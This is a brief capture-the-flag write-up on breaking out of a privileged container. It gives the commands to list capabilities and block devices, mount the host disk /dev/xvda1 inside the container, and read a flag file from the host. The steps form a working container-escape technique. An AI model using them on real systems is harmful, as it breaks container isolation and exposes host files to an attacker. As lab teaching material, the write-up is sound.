WRITE-UPS

**Privileged container**

Identify capabilities with:
```console
capsh --print
```

search for mounting points with:

```console
lsblk
```

This will show you:

```console
root@98cc2350da20:~# lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
xvda    202:0    0   10G  0 disk 
|-xvda1 202:1    0    9G  0 part /etc/hosts
|-xvda2 202:2    0    1K  0 part 
`-xvda5 202:5    0  975M  0 part [SWAP]
xvdh    202:112  0    1G  0 disk 
```

Now make a folder for mounting:

```console

mkdir /tmp/host

```

Then you can mount to host machine:

```console
mount /dev/xvda1 /tmp/host
```

Now you can simply cat the flag from host:

```console
cat /tmp/host/etc/flag.txt
```
